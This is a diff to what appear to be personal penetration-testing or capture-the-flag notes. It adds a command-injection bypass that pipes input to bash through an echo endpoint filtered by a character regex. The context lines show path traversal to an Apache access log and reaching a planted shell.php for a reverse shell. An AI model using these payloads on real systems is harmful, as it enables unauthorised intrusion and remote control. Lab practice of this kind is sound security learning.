@@ -45,3 +45,12 @@ http://IP/?view=dog../../../../../cat/../var/log/apache2/access.log&ext=
 - Then access to `http://IP/shell.php` and you got the reverse shell
 
 ---
+
+When we can echo commands try and it's using a regex like: `/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/` try:
+
+```shell
+http://IP_HOST/echo.php?search=id+|+bash
+# Then just try other commands like
+echo.php?search=ls+|+bash
+# Then try to input a reverse shell
+```
